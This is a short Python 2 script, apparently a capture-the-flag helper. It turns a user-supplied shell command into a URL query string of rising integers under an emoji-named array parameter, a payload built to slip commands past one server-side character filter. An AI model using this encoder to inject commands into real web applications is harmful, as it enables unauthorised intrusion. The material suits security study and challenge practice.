#coding=utf-8
cmd = raw_input("command : ")

payload = ""
biggest = 0
first = True

for c in cmd:
	tmp = ord(c)
	while tmp < biggest:
		tmp += 256
	biggest = tmp

	if first:
		payload = "?🍣[]=" + str(tmp)
		first = False
	else:
		payload += "&🍣[]=" + str(tmp)

print(payload)
